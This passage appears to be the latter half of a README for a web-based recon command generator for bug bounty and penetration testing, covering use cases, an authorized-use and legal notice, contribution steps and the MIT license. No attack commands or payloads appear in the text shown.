├── SECURITY.md             # Responsible use & vulnerability disclosure policy
└── LICENSE                 # MIT License
```

---

## 🎯 Use Cases

### Bug Bounty Hunting
Start a new engagement, enter the target domain, and instantly have a full structured recon checklist with correctly-formatted commands — ready to run in sequence.

### Penetration Testing
Use the toolkit as a methodology aid to ensure no category is skipped. Export the full command set as a checklist. Attach generated outputs as supporting evidence in reports.

### CTF Competitions
Quick reference for tool syntax and flags during time-pressured CTF challenges across web, network, and OSINT categories.

### Security Education
Students learning offensive security tools can see exact command syntax, understand what each flag does, and install tools they haven't used before — all without leaving the page.

### Automation Pipeline Building
Security automation developers can use the generated commands as reference templates when building their own recon pipelines, CI/CD security checks, or scheduled scanning workflows.

---

## ⚖️ Ethical & Legal Use

> **This tool is for authorized security testing and educational purposes only.**

By using this toolkit, you acknowledge that:

- ✅ You will only use generated commands against systems you **own** or have **explicit written authorization** to test
- ✅ You understand that unauthorized access to computer systems is **illegal** under the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, Indian IT Act, and equivalent laws worldwide
- ✅ Bug bounty usage must comply with the **in-scope rules** of the respective program's policy
- ❌ The authors bear **zero responsibility** for any unauthorized or illegal use of this tool
- ❌ This toolkit does **not** perform any scanning itself — it only generates commands that you run locally

If you're hunting on bug bounty programs, always check the program's scope before running any commands.

---

## 🤝 Contributing

Contributions are welcome from the security community. Whether you want to add a new tool, fix incorrect syntax, add a new attack category, or improve the UI:

1. **Fork** the repository
2. **Create a branch**: `git checkout -b feature/add-tool-xyz`
3. **Make your changes** and test them
4. **Commit** with conventional format: `git commit -m "feat: add XYZ command to SSRF category"`
5. **Push** and open a Pull Request

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide and coding standards.

**What to contribute:**
- ➕ New tools and their commands
- 🔧 Updated/corrected command flags (tools update frequently)
- 🗂️ New attack categories
- 📱 UI/UX improvements
- 📖 Documentation

---

## 📜 License

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for details.

---

<div align="center">

**Built by [Malware](https://github.com/YOUR_USERNAME) — Bug Bounty Hunter & Automation Developer**

[![Live Tool](https://img.shields.io/badge/🔗%20Use%20the%20Live%20Tool-cybersec--toolkit.netlify.app-00ff41?style=for-the-badge)](https://cybersec-toolkit.netlify.app/)

```
[ root@recon ~]# █
```

_Stay legal. Stay ethical. Happy hunting._ ☠️

</div>
